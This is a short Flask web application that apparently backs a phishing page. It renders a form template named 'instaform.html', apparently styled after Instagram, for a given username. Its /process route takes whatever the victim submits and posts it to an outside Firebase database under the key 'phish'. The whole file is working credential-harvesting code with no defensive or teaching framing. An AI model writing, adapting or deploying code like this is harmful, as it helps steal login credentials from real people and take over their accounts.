from flask import Flask,render_template,request,redirect,url_for
import json
import smtplib
from firebase import firebase


firebase = firebase.FirebaseApplication('https://alpine-gasket-284418.firebaseio.com')
app = Flask(__name__)

@app.route('/<user>')
@app.route('/index/<user>')
def index(user):
    name = user
    return render_template('instaform.html',user=name)
@app.route('/process',methods=['GET','POST'])
def process():
   
    if request.method == 'POST':
        data = request.form
        firebase.post("phish",data)
        
        return data




if __name__=="__main__":
    app.run(debug=True)